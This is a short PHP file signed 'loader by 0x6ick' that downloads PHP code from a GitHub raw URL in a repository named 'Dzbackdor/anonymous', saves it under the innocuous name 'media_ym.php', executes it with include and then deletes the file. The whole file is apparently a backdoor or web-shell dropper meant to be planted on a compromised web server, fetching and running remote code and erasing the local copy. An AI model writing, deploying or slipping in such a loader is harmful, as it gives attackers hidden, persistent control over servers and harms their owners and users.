<?php

/* loader by 0x6ick - https://0x6ick.my.id */

$tmp = 'media_ym.php';

$url = 'https://raw.githubusercontent.com/Dzbackdor/anonymous/refs/heads/main/void/mini/fileload.php';

if (!file_exists($tmp) || filesize($tmp) < 10) {

    $code = file_get_contents($url);

    file_put_contents($tmp, $code);

}

include($tmp);

unlink($tmp);

?>
